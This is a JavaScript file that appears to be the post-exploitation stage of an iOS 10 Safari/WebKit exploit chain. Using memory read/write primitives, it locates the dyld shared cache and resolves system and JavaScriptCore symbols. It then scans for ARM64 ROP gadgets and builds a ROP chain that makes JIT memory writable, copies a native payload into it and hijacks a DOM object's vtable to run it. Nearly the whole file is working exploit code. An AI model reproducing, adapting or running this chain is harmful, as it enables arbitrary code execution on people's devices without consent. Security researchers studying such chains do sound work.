//if (typeof importScripts !== "undefined") importScripts("https://local.ptron/Homepage/functions.js");

// http://local.ptron/Test/ToDo/Meridian/1.html

var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function(a, d, e)
{
	a != Array.prototype && a != Object.prototype && (a[d] = e.value)
};
$jscomp.getGlobal = function(a)
{
	return "undefined" != typeof window && window === a ? a : "undefined" != typeof global && null != global ? global : a
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function()
{
	$jscomp.initSymbol = function() {};
	$jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol)
};
$jscomp.Symbol = function()
{
	var a = 0;
	return function(d)
	{
		return $jscomp.SYMBOL_PREFIX + (d || "") + a++
	}
}();
$jscomp.initSymbolIterator = function()
{
	$jscomp.initSymbol();
	var a = $jscomp.global.Symbol.iterator;
	a || (a = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
	"function" != typeof Array.prototype[a] && $jscomp.defineProperty(Array.prototype, a,
	{
		configurable: !0,
		writable: !0,
		value: function()
		{
			return $jscomp.arrayIterator(this)
		}
	});
	$jscomp.initSymbolIterator = function() {}
};
$jscomp.initSymbolAsyncIterator = function()
{
	$jscomp.initSymbol();
	var a = $jscomp.global.Symbol.asyncIterator;
	a || (a = $jscomp.global.Symbol.asyncIterator = $jscomp.global.Symbol("asyncIterator"));
	$jscomp.initSymbolAsyncIterator = function() {}
};
$jscomp.arrayIterator = function(a)
{
	var d = 0;
	return $jscomp.iteratorPrototype(function()
	{
		return d < a.length ?
		{
			done: !1,
			value: a[d++]
		} :
		{
			done: !0
		}
	})
};
$jscomp.iteratorPrototype = function(a)
{
	$jscomp.initSymbolIterator();
	a = {
		next: a
	};
	a[$jscomp.global.Symbol.iterator] = function()
	{
		return this
	};
	return a
};
$jscomp.polyfill = function(a, d, e, h)
{
	if (d)
	{
		e = $jscomp.global;
		a = a.split(".");
		for (h = 0; h < a.length - 1; h++)
		{
			var v = a[h];
			v in e || (e[v] = {});
			e = e[v]
		}
		a = a[a.length - 1];
		h = e[a];
		d = d(h);
		d != h && null != d && $jscomp.defineProperty(e, a,
		{
			configurable: !0,
			writable: !0,
			value: d
		})
	}
};
$jscomp.polyfill("Array.from", function(a)
{
	return a ? a : function(a, e, h)
	{
		$jscomp.initSymbolIterator();
		e = null != e ? e : function(a)
		{
			return a
		};
		var d = [],
			y = a[Symbol.iterator];
		if ("function" == typeof y)
		{
			a = y.call(a);
			for (var k = 0; !(y = a.next()).done;) d.push(e.call(h, y.value, k++))
		}
		else
			for (y = a.length, k = 0; k < y; k++) d.push(e.call(h, a[k], k));
		return d
	}
}, "es6", "es3");
$jscomp.checkStringArgs = function(a, d, e)
{
	if (null == a) throw new TypeError("The 'this' value for String.prototype." + e + " must not be null or undefined");
	if (d instanceof RegExp) throw new TypeError("First argument to String.prototype." + e + " must not be a regular expression");
	return a + ""
};
$jscomp.polyfill("String.prototype.startsWith", function(a)
{
	return a ? a : function(a, e)
	{
		var d = $jscomp.checkStringArgs(this, a, "startsWith");
		a += "";
		var v = d.length,
			y = a.length;
		e = Math.max(0, Math.min(e | 0, d.length));
		for (var k = 0; k < y && e < v;)
			if (d[e++] != a[k++]) return !1;
		return k >= y
	}
}, "es6", "es3");
$jscomp.iteratorFromArray = function(a, d)
{
	$jscomp.initSymbolIterator();
	a instanceof String && (a += "");
	var e = 0,
		h = {
			next: function()
			{
				if (e < a.length)
				{
					var v = e++;
					return {
						value: d(v, a[v]),
						done: !1
					}
				}
				h.next = function()
				{
					return {
						done: !0,
						value: void 0
					}
				};
				return h.next()
			}
		};
	h[Symbol.iterator] = function()
	{
		return h
	};
	return h
};
$jscomp.polyfill("Array.prototype.keys", function(a)
{
	return a ? a : function()
	{
		return $jscomp.iteratorFromArray(this, function(a)
		{
			return a
		})
	}
}, "es6", "es3");
$jscomp.owns = function(a, d)
{
	return Object.prototype.hasOwnProperty.call(a, d)
};
$jscomp.polyfill("Object.values", function(a)
{
	return a ? a : function(a)
	{
		var e = [],
			d;
		for (d in a) $jscomp.owns(a, d) && e.push(a[d]);
		return e
	}
}, "es8", "es3");

function hex(a)
{
	return ("0" + a.toString(16)).substr(-2)
}

function hexlify(a)
{
	for (var d = [], e = 0; e < a.length; e++) d.push(hex(a[e]));
	return d.join("")
}

function unhexlify(a)
{
	if (1 == a.length % 2) throw new TypeError("Invalid hex string");
	for (var d = new Uint8Array(a.length / 2), e = 0; e < a.length; e += 2) d[e / 2] = parseInt(a.substr(e, 2), 16);
	return d
}

function hexdump(a)
{
	"undefined" !== typeof a.BYTES_PER_ELEMENT && (a = Array.from(a));
	for (var d = [], e = 0; e < a.length; e += 16)
	{
		var h = a.slice(e, e + 16).map(hex);
		8 < h.length && h.splice(8, 0, " ");
		d.push(h.join(" "))
	}
	return d.join("\n")
}
var Struct = function()
{
	var a = new ArrayBuffer(8),
		d = new Uint8Array(a),
		e = new Uint32Array(a),
		h = new Float64Array(a);
	return {
		pack: function(d, e)
		{
			d[0] = e;
			return new Uint8Array(a, 0, d.BYTES_PER_ELEMENT)
		},
		unpack: function(a, e)
		{
			if (e.length !== a.BYTES_PER_ELEMENT) throw Error("Invalid bytearray");
			d.set(e);
			return a[0]
		},
		int8: d,
		int32: e,
		float64: h
	}
}();

function ab2str(a)
{
	return String.fromCharCode.apply(null, new Uint16Array(a))
}

function str2ab(a)
{
	for (var d = new ArrayBuffer(2 * a.length), e = new Uint16Array(d), h = 0, v = a.length; h < v; h++) e[h] = a.charCodeAt(h);
	return d
};

/*
/\b10_\S+ like Mac OS X/.test(navigator.userAgent) || (window.crypto.subtle || window.crypto.webkitSubtle).digest(
{
	name: "SHA-1"
}, str2ab(window.location.hash)).then(function(a)
{
	if ("9e04130fa02fc3c416f28ba556f0165da4d93054" != hexlify(new Uint8Array(a))) throw null;
}).catch(function()
{
	document.title = "Incompatible Spyware";
	for (var a = document.body; a.firstChild;) a.removeChild(a.firstChild);
	var d = document.createElement("div");
	d.className = "center";
	d.appendChild(document.createElement("h1")).textContent = "Hello from the NSA!";
	d.appendChild(document.createElement("h2")).textContent = "Unfortunately this spyware is only compatible with iOS 10. You're not on that version, so don't try it. At all. It will break something. Seriously. Forget we said anything.";
	a.appendChild(d);
	a.className = "incompatible";
	window.ontouchmove = void 0;
	window.ontouchend = void 0;
	window.onmousemove = void 0;
	window.onmouseup = void 0;
	window.ontouchstart = function(a)
	{
		a.preventDefault();
		return !1
	}
});

window.addEventListener("load", function()
{
	var a = function()
	{
		var a = document.getElementById("logo");
		a.parentNode.removeChild(a);
		document.body.className = "wait";
		document.getElementById("notice").textContent = "Running exploit...";
		window.setTimeout(function()
		{
			window.go() // my1
		}, 10)
	};
	(function()
	{
		var d = document.getElementById("thumbtack"), e = document.getElementById("hint");

		if (d && e)
		{
			var h = 0,
				v = null,
				y = d.parentNode.clientWidth - d.clientWidth - 5,
				k = null,
				q = function(a)
				{
					h = a;
					e.style.opacity = 1 - a / (.25 * y);
					d.style.left = a + "px"
				},
				f =
				function(a)
				{
					v = a;
					k = h;
					d.style.WebkitTransitionProperty = "";
					d.style.WebkitTransitionDuration = "0s";
					return !1
				},
				m = function(a)
				{
					null !== v && (a -= v, 0 > a ? a = 0 : a >= y && (a = y), q(a + k))
				},
				F = function()
				{
					if (null !== v)
					{
						v = null;
						if (.9 <= h / y)
						{
							q(y);
							if (a)
							{
								var e = a;
								a = void 0;
								e()
							}
							return !1
						}
						e = h;
						q(0);
						d.style.WebkitTransform = "translateX(" + e + "px)";
						setTimeout(function()
						{
							d.style.WebkitTransitionProperty = "-webkit-transform";
							d.style.WebkitTransitionDuration = "0.25s";
							d.style.WebkitTransform = "translateX(0px)"
						}, 0);
						return !1
					}
				};
			d.ontouchstart = function(a)
			{
				return f(a.targetTouches[0].clientX)
			};
			window.ontouchmove = function(a)
			{
				return m(a.targetTouches[0].clientX)
			};
			window.ontouchend = function(a)
			{
				return F()
			};
			d.onmousedown = function(a)
			{
				return f(a.clientX)
			};
			window.onmousemove = function(a)
			{
				return m(a.clientX)
			};
			window.onmouseup = function(a)
			{
				return F()
			};
			return this
		}
	})();
	window.ontouchstart = function(a)
	{
		a.preventDefault();
		return !1
	}
});
*/

function Int64(a)
{
	function d(a, e)
	{
		return function()
		{
			if (arguments.length != e) throw Error("Not enough arguments for function " + a.name);
			for (var d = 0; d < arguments.length; d++) arguments[d] instanceof Int64 || (arguments[d] = new Int64(arguments[d]));
			return a.apply(this, arguments)
		}
	}
	var e = new Uint8Array(8);
	switch (typeof a)
	{
		case "number":
			a = "0x" + Math.floor(a).toString(16);
		case "string":
			a.startsWith("0x") && (a = a.substr(2));
			1 == a.length % 2 && (a = "0" + a);
			a = unhexlify(a, 8);
			e.set(Array.from(a).reverse());
			break;
		case "object":
			if (a instanceof Int64) e.set(a.bytes());
			else
			{
				if (8 != a.length) throw TypeError("Array must have exactly 8 elements.");
				e.set(a)
			}
			break;
		case "undefined":
			break;
		default:
			throw TypeError("Int64 constructor requires an argument.");
	}
	this.asDouble = function()
	{
		if (255 == e[7] && (255 == e[6] || 254 == e[6])) throw new RangeError("Integer can not be represented by a double");
		return Struct.unpack(Struct.float64, e)
	};
	this.asJSValue = function()
	{
		if (0 == e[7] && 0 == e[6] || 255 == e[7] && 255 == e[6]) throw new RangeError("Integer can not be represented by a JSValue");
		this.assignSub(this, 281474976710656);
		var a = Struct.unpack(Struct.float64, e);
		this.assignAdd(this, 281474976710656);
		return a
	};
	this.bytes = function()
	{
		return Array.from(e)
	};
	this.byteAt = function(a)
	{
		return e[a]
	};
	this.toString = function()
	{
		return "0x" + hexlify(Array.from(e).reverse())
	};
	this.lo = function()
	{
		var a = this.bytes();
		return (a[0] | a[1] << 8 | a[2] << 16 | a[3] << 24) >>> 0
	};
	this.hi = function()
	{
		var a = this.bytes();
		return (a[4] | a[5] << 8 | a[6] << 16 | a[7] << 24) >>> 0
	};
	this.assignNeg = d(function(a)
	{
		for (var d = 0; 8 > d; d++) e[d] = ~a.byteAt(d);
		return this.assignAdd(this, Int64.One)
	}, 1);

	this.assignAdd = d(function(a, d)
	{
		for (var h = 0, k = 0; 8 > k; k++)
		{
			var q = a.byteAt(k) + d.byteAt(k) + h;
			h = 255 < q | 0;
			e[k] = q
		}
		return this
	}, 2);

	this.assignSub = d(function(a, d)
	{
		for (var h = 0, k = 0; 8 > k; k++)
		{
			var q = a.byteAt(k) - d.byteAt(k) - h;
			h = 0 > q | 0;
			e[k] = q
		}
		return this
	}, 2)
}

Int64.fromDouble = function(a)
{
	a = Struct.pack(Struct.float64, a);
	return new Int64(a)
};

function Neg(a)
{
	return (new Int64).assignNeg(a)
}

function Add(a, d)
{
	return (new Int64).assignAdd(a, d)
}

function Sub(a, d)
{
	return (new Int64).assignSub(a, d)
}

Int64.Zero = new Int64(0);

Int64.One = new Int64(1);

(function()
{
	function a(a, d)
	{
		d instanceof Int64 || (d = new Int64(d));
		for (var e = 0; e < a.length; ++e)
		{
			var f = a[e].fileoff,
				q = Add(f, a[e].size);
			if ((f.hi() < d.hi() || f.hi() == d.hi() && f.lo() <= d.lo()) && (q.hi() > d.hi() || q.hi() == d.hi() && q.lo() > d.lo())) return Add(a[e].addr, Sub(d, f))
		}
		return new Int64("0x4141414141414141")
	}

	function d(d, f, h, k, v)
	{
		k = Array.from(k);
		void 0 === v && (v = {});
		for (var q = null, m = d.u32(Add(f, 16)), n = 0, r = 32; n < m; ++n)
		{
			if (2 == d.u32(Add(f, r)))
			{
				q = d.read(Add(f, r + 8), 16);
				q = {
					symoff: b2u32(q.slice(0, 4)),
					nsyms: b2u32(q.slice(4,
						8)),
					stroff: b2u32(q.slice(8, 12)),
					strsize: b2u32(q.slice(12, 16))
				};
				break
			}
			r += d.u32(Add(f, r + 4))
		}

		null == q && prompt(undefined, "stab");
		var x = a(h, q.stroff),
			y = 0;
		f = function(a)
		{
			return d.read(Add(x, y + a), 1)[0]
		};
		for (n = 0; n < q.nsyms && 0 < k.length; ++n)
			for (y = d.u32(a(h, q.symoff + 16 * n)), m = 0; m < k.length; ++m)
				if (r = k[m], e(f, r))
				{
					v[r] = d.readInt64(a(h, q.symoff + 16 * n + 8));
					k.splice(m, 1);
					break
				} return v
	}

	function e(a, d)
	{
		for (var e = "function" == typeof a ? a : function(d)
			{
				return a[d]
			}, f = 0; f < d.length; ++f)
			if (e(f) != d.charCodeAt(f)) return !1;
		return 0 == e(d.length)
	}

	function h(a)
	{
		return b2u32(this.read(a, 4))
	}

	function v(a, d)
	{
		a instanceof Int64 && (a = a.lo());
		d instanceof Int64 && (d = d.lo());
		a + d > this.length && prompt(undefined, "OOB read: " + a + " -> " + (a + d) + ", size: " + d);
		return this.slice(a, a + d)
	}

	function y(a)
	{
		return new Int64(this.read(a, 8))
	}

	function k(a, d)
	{
		a instanceof Int64 && (a = a.lo());
		this.set(d.bytes(), a)
	}

	window.fail = function(a)
	{
		alert("FAIL: " + a);
		//location.reload();
		throw null;
	};

	window.b2u32 = function(a)
	{
		return (a[0] | a[1] << 8 | a[2] << 16 | a[3] << 24) >>> 0
	};

	window.spyware = function(q, f, m) // my5
	{
		var F = document.createElement("div")

		var P = q.addrof(F)

		var J = f.readInt64(P + 24)

		var U = f.readInt64(J)

		f.u32 = h;

		for (var n = f.readInt64(U), r = Sub(n, n.lo() & 4095); !e(f.read(r, 16), "dyld_v1   arm64");)
		{
			r = Sub(r, 4096);
		}

		var x = null

		var G = f.u32(Add(r, 20))

		var C = f.read(Add(r, f.u32(Add(r, 16))), 32 * G)

		n = [];

		for (var l = 0; l < G; l++)
		{
			var g = 32 * l;

			g =
			{
				addr: new Int64(C.slice(g + 0, g + 8)),

				size: new Int64(C.slice(g + 8, g + 16)),

				fileoff: new Int64(C.slice(g + 16, g + 24)),

				maxprot: b2u32(C.slice(g + 24, g + 28)),

				initprot: b2u32(C.slice(g + 28, g + 32))
			};

			n.push(g);

			g.fileoff.hi() != 0 || g.fileoff.lo() != 0 || g.size.hi() == 0 && g.size.lo() == 0 || (x = g)
		}

		x == null && prompt(undefined, "base_seg");

		G = Sub(r, x.addr);

		for (l = 0; l < n.length; l++)
		{
			n[l].addr = Add(n[l].addr, G);
		}

		var M =
		{
			"/usr/lib/system/libsystem_platform.dylib": ["__longjmp", "__platform_memmove"],
			"/usr/lib/system/libsystem_kernel.dylib": ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
			"/usr/lib/system/libsystem_c.dylib": ["_usleep"],
			"/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore": ["__ZN3JSC32startOfFixedExecutableMemoryPoolE", "__ZN3JSC30endOfFixedExecutableMemoryPoolE"]
		};

		/*
			Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1

			Regex:
				10_3_3 like Mac OS X

		*/
		//if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) // my6
		//{
			C =
			{
				regloader: [2853635040, 2853569505, 2853700578, 2853766115, 2853831652, 2853897189, 3594453888],

				dispatch: [3594453664, 2839772157, 2839695348, 2839631862, 2432762879, 3596551104],

				altdispatch: [3594453664, 3506471871, 2839706621, 2839629812, 2831374326, 3596551104],

				stackloader: [2839968765, 2839891956, 2839828470, 2839764984, 2839701498, 2839638012, 2432812031, 3596551104],

				altstackloader: [3506521023, 2839903229, 2839826420, 2839762934, 2839699448, 2839635962, 2831577084, 3596551104]
			};

			var R = ["/usr/lib/libLLVM.dylib"]
		/*
		}
		else
		{
			M["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push("__ZN3JSC29jitWriteSeparateHeapsFunctionE")

			C =
			{
				ldrx8: [4181722088, 4177527400, 2839706621, 2839629812, 2432746495, 3596551104],
				dispatch: [3594453664, 2839772157, 2839695348, 2839631862, 2432762879, 3596551104],
				regloader: [2853569507, 2853897190, 2853700576, 2853372897, 2853635042, 4181722084, 3594453248],
				stackloader: [2839968765, 2839891956, 2839828470, 2839764984, 2839701498, 2839638012, 2432812031, 3596551104],
				movx4: [2853438436, 3594453248],
				ldrx0x0: [4181721088]
			}

			R = ["/usr/lib/PN548.dylib", "/usr/lib/libc++.1.dylib"]
		}
		*/

		x = {};

		var D = {}

		var B = Add(r, f.u32(Add(r, 24)))

		r = f.u32(Add(r, 28));

		for (l = 0; l < r; l++)
		{
			var Z = a(n, f.u32(Add(B, 32 * l + 24)))

			var V = function(a)
			{
				return f.read(Add(Z, a), 1)[0]
			}

			var w = Add(f.readInt64(Add(B, 32 * l)), G)

			if (R.some(function(a) // nada
				{
					return e(V, a)
				}))
			{
				var u = f.u32(Add(w, 16))
				var p = 0

				for (g = 32; p < u; p++)
				{
					var t = f.u32(Add(w, g));

					if (t == 25 && e(f.read(Add(w, g + 8), 16), "__TEXT"))
					{
						t = f.u32(Add(w, g + 64));

						u = 0;

						for (p = g + 72; u < t; u++)
						{
							if (e(f.read(Add(w, p), 16), "__text"))
							{
								g = Object.keys(C).filter(function(a)
								{
									return !D.hasOwnProperty[a]
								});

								if (g.length == 0)
								{
									break;
								}

								u = {};

								for (var z = 0; z < g.length; ++z)
								{
									u[g[z]] = 0;
								}

								t = Add(f.readInt64(Add(w, p + 32)), G);

								w = f.u32(Add(w, p + 40));

								p = new Uint32Array(w / 4);

								for (var E = 0; E < w; E += 4096)
								{
									var H = 4096;

									w - E < H && (H = w - E);

									z = f.read(Add(t, E), H);

									for (var A = 0; A < H; A += 4)
									{
										var L = b2u32(z.slice(A, A + 4));
										p[(E + A) / 4] = L
									}
								}

								for (E = 0; E < w && 0 < g.length; E++)
								{
									for (H = p[E], z = 0; z < g.length; z++)
									{
										if (A = g[z], L = C[A], H == L[u[A]])
										{
											if (u[A]++, u[A] == L.length)
											{
												D[A] = Add(t, 4 * (E - (L.length - 1)));
												g.splice(z, 1);
												break
											}
										}
										else
										{
											u[A] = 0
										}
									}
								}

								break
							}
							p += 80
						}
						break
					}
					g += f.u32(Add(w, g + 4))
				}
			}
			else
			{
				g = null;

				u = Object.keys(M);

				for (p = 0; p < u.length; p++)
				{
					if (e(V, u[p]))
					{
						g = M[u[p]]

						break
					}
				}

				g != null && d(f, w, n, g, x)
			}
		}

		D.dispatch || (D.dispatch = D.altdispatch);

		D.stackloader || (D.stackloader = D.altstackloader);

		delete C.altdispatch;

		delete C.altstackloader;

		u = Object.values(M).reduce(function(a, b)
		{
			b.forEach(function(b)
			{
				a.push(b)
			});

			return a

		}, []);

		for (l = 0; l < u.length; l++)
		{
			n = u[l]

			x[n] == null && prompt(undefined, n)

			x[n] = Add(x[n], G)
		}

		u = Object.keys(C);

		for (l = 0; l < u.length; l++)
		{
			n = u[l]

			D[n] == null && prompt(undefined, n)
		}

		G = x.__longjmp;

		var S = D.regloader
		var N = D.dispatch
		var T = D.stackloader
		var Q = D.ldrx8
		var W = D.movx4
		var X = new Int64(f.readInt64(x._mach_task_self_).lo())
		var Y = x.__kernelrpc_mach_vm_protect_trap

		C = x.__platform_memmove;
		M = x._usleep;

		R = f.readInt64(x.__ZN3JSC32startOfFixedExecutableMemoryPoolE);

		n = f.readInt64(x.__ZN3JSC30endOfFixedExecutableMemoryPoolE);

		x = x.__ZN3JSC29jitWriteSeparateHeapsFunctionE ? f.readInt64(x.__ZN3JSC29jitWriteSeparateHeapsFunctionE) : Int64.Zero;

		m.u32 = h;

		m.read = v;

		m.readInt64 = y;

		m.writeInt64 = k;

		w = new Int64("0xffffffffffffffff");

		B = new Int64(0);

		u = m.u32(16);

		l = 0;

		for (g = 32; l < u; l++)
		{
			t = m.u32(g);

			if (t == 25 && (p = m.readInt64(g + 48), p.hi() != 0 || p.lo() != 0))
			{
				r = m.readInt64(g + 24);

				t = m.readInt64(g + 32);

				t = Add(r, t);

				if (r.hi() < w.hi() || r.hi() == w.hi() && r.lo() <= w.lo())
				{
					w = r;
				}

				if (t.hi() > B.hi() || t.hi() == B.hi() && t.lo() > B.lo())
				{
					B = t
				}
			}

			g += m.u32(g + 4)
		}

		B = Sub(B, w);

		B.hi() != 0 && prompt(undefined, "shsz")

		z = new Uint8Array(B.lo());

		r = f.readInt64(Add(q.addrof(z), 16));

		var K = Sub(n, B);

		K = Sub(K, K.lo() & 16383);

		E = Sub(K, w);

		n = [];

		g = 32;

		for (l = 0; l < u; ++l)
		{
			t = m.u32(g);

			if (t == 25 && (p = m.readInt64(g + 48), p.hi() != 0 || p.lo() != 0))
			{
				H = m.readInt64(g + 24);

				t = m.readInt64(g + 32);

				A = m.readInt64(g + 40);

				L = m.readInt64(g + 56);

				if (t.hi() < p.hi() || t.hi() == p.hi() && t.lo() <= p.lo()) p = t;

				n.push(
				{
					addr: Sub(H, w),
					size: p,
					fileoff: A,
					prots: L
				});

				A.hi() != 0 && prompt(undefined, "fileoff");

				p.hi() != 0 && prompt(undefined, "filesize");

				A = A.lo();

				p = p.lo();

				z.set(m.slice(A, A + p), Sub(H, w).lo())
			}

			g += m.u32(g + 4)
		}

		z.u32 = h;

		z.read = v;

		z.readInt64 = y;

		m = d(z, 0, n, ["genesis"]);

		m.genesis == null && prompt(undefined, "genesis");

		m = Add(m.genesis, E);

		/*
		l = location.search.substr(1).split("&");

		for (g = 0; g < l.length; g++)
		{
			param = l[g].split("=");

			//prompt(undefined, param[0])

			if (param[0] == "debug_with_vtab_smash")
			{
				if (!confirm("You are running a debug feature, which will cause instability, if you weren't instructed to do so, please stop using it!")) throw alert("Ok pls remove the arg and reload the site"), "stop yo";

				u = parseInt(decodeURIComponent(param[1]));

				if (isNaN(u)) throw "w00t I said ints...";

				smash_int = new Int64("0x4241414141414141");

				for (t = 0; t < u; t += 8)
				{
					f.writeInt64(Add(U, t), Add(smash_int, t))
				}

				alert("Smashed vtab! Pls get the newest crash log and show it to us")
			}
			else if (param[0] == "dump_el_obj")
			{
				if (!confirm("You are running a debug feature, if you weren't instructed to do so, please stop using it!")) throw alert("Ok pls remove the arg and reload the site"), "stop yo";

				F = parseInt(decodeURIComponent(param[1]));

				if (isNaN(F)) throw "w00t I said ints...";

				F *= 8;

				z = "";

				for (J = 0; J < F; J += 8)
				{
					z += hexlify(f.readInt64(Add(P, J)).bytes) + "\n";
				}

				document.write(z);

				alert("Ok, stopped running code now");

				throw "bye bye";
			}
		}
		*/

		f.writeInt64(Add(U, 24), G);

		f.writeInt64(Add(J, 88), T);

		g = 4096;

		var c = new Uint32Array(1048576)

		var I = f.readInt64(Add(q.addrof(c), 16))

		var b = 1048576 - g

		var aa = function(a, d, e, g, f, h, k)
		{
			h = h || Int64.Zero;
			c[b++] = 3735879696;
			c[b++] = 3735879697;
			c[b++] = 3735879698;
			c[b++] = 3735879699;
			c[b++] = N.lo();
			c[b++] = N.hi();
			c[b++] = 3735879700;
			c[b++] = 3735879701;
			c[b++] = h.lo();
			c[b++] = h.hi();
			c[b++] = f.lo();
			c[b++] = f.hi();
			c[b++] = g.lo();
			c[b++] = g.hi();
			c[b++] = d.lo();
			c[b++] = d.hi();
			c[b++] = e.lo();
			c[b++] = e.hi();
			c[b++] = a.lo();
			c[b++] = a.hi();
			c[b++] = 3735879704;
			c[b++] = 3735879705;
			c[b++] = 3735879706;
			c[b++] = 3735879707;
			a = b;
			c[b++] = Add(I, 4 * a + 64).lo();
			c[b++] = Add(I, 4 * a + 64).hi();
			c[b++] = S.lo();
			c[b++] = S.hi();
			c[b++] = 3735879712;
			c[b++] = 3735879713;
			c[b++] = 3735879714;
			c[b++] = 3735879715;
			c[b++] = 3735879716;
			c[b++] = 3735879717;
			c[b++] = 3735879718;
			c[b++] = 3735879719;
			c[b++] = 3735879720;
			c[b++] = 3735879721;
			c[b++] = 3735879722;
			c[b++] = 3735879723;
			a = b;
			c[b++] = Add(I, 4 * a + 112).lo();
			c[b++] = Add(I, 4 * a + 112).hi();
			c[b++] = k.lo();
			c[b++] = k.hi()
		}

		var ba = function(a, d, e, g, f, h, k)
		{
			c[b++] = 3735879696;
			c[b++] = 3735879697;
			c[b++] = 3735879698;
			c[b++] = 3735879699;
			c[b++] = 3735884033;
			c[b++] = 3735884034;
			c[b++] = 3735879700;
			c[b++] = 3735879701;
			c[b++] = 3735879702;
			c[b++] = 3735879703;
			c[b++] = f.lo();
			c[b++] = f.hi();
			c[b++] = d.lo();
			c[b++] = d.hi();
			c[b++] = g.lo();
			c[b++] = g.hi();
			c[b++] = f.lo();
			c[b++] = f.hi();
			c[b++] = a.lo();
			c[b++] = a.hi();
			c[b++] = 3735879704;
			c[b++] = 3735879705;
			d = b;
			c[b++] = Add(I, 4 * d).lo();
			c[b++] = Add(I, 4 * d).hi();
			c[b++] = 3735879708;
			c[b++] = 3735879709;
			c[b++] = Q.lo();
			c[b++] = Q.hi();
			h ? (c[b++] = T.lo(), c[b++] = T.hi()) : (c[b++] = N.lo(), c[b++] = N.hi());
			c[b++] = 3735884801;
			c[b++] = 3735884802;
			c[b++] = 3735884545;
			c[b++] = 3735884546;
			c[b++] = e.lo();
			c[b++] = e.hi();
			c[b++] = 3735884289;
			c[b++] = 3735884290;
			c[b++] = S.lo();
			c[b++] = S.hi();

			h && (c[b++] = 3668770832, c[b++] = 3668770833, c[b++] = 3668770834, c[b++] = 3668770835, c[b++] = 3668775169, c[b++] = 3668775170, c[b++] = 3668770836, c[b++] = 3668770837, c[b++] = 3668770838, c[b++] = 3668770839, c[b++] = 3668770840, c[b++] = 3668770841, c[b++] = 3668771056, c[b++] = 3668771057, c[b++] = 3668771058, c[b++] = 3668771059, c[b++] = 3668771060, c[b++] = 3668771061, c[b++] = a.lo(), c[b++] = a.hi(), c[b++] = 3668770840, c[b++] = 3668770841, d = b, c[b++] = Add(I, 4 * d).lo(), c[b++] = Add(I, 4 * d).hi(), c[b++] = 3668770844, c[b++] = 3668770845,
				c[b++] = Q.lo(), c[b++] = Q.hi(), c[b++] = N.lo(), c[b++] = N.hi(), c[b++] = 3668775937, c[b++] = 3668775938, c[b++] = h.lo(), c[b++] = h.hi(), c[b++] = 3668775681, c[b++] = 3668775682, c[b++] = 3668775425, c[b++] = 3668775426, c[b++] = W.lo(), c[b++] = W.hi());

			c[b++] = 3735879714;
			c[b++] = 3735879715;
			c[b++] = 3735879714;
			c[b++] = 3735879715;
			c[b++] = 3735879716;
			c[b++] = 3735879717;
			c[b++] = 3735879718;
			c[b++] = 3735879719;
			c[b++] = 3735879720;
			c[b++] = 3735879721;
			c[b++] = 3735879722;
			c[b++] = 3735879723;
			c[b++] = 3735879724;
			c[b++] = 3735879725;
			c[b++] = k.lo();
			c[b++] = k.hi()
		}

		var O = function(a, b, c, d, e, g, f)
		{
			b = b || Int64.Zero;
			c = c || Int64.Zero;
			d = d || Int64.Zero;
			e = e || Int64.Zero;
			f = f || T;
			return (Q ? ba : aa)(a, b, c, d, e, g, f)
		};

		//if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent))
		//{
			(O(Y, X, K, B, new Int64(0), new Int64(7)), O(C, K, r, B))
		/*
		}
		else
		{
			if (x.lo() || x.hi())
			{
				O(x, Sub(K, R), r, B)
			}
			else
			{
				prompt(undefined, "bi0n1c (c)")
			}

			n.forEach(function(a)
			{
				if (a.prots.hi() & 2)
				{
					var b = Add(a.addr, K);

					O(Y, X, b, a.size, new Int64(0), new Int64(19))
				}
			})
		}
		*/

		O(M, new Int64(1E5));

		O(m);

		for (l = 0; 32 > l; l++)
		{
			c[b++] = 3724591326 + (l << 16)
		}

		P = Add(I, 4 * (1048576 - g));

		f.writeInt64(Add(J, 96), Add(P, 96));

		f.writeInt64(Add(J, 104), P);

		F.addEventListener("click", function(){});

		prompt(undefined, "should never reach this")
	}
})();

//prompt(undefined, "ok_1")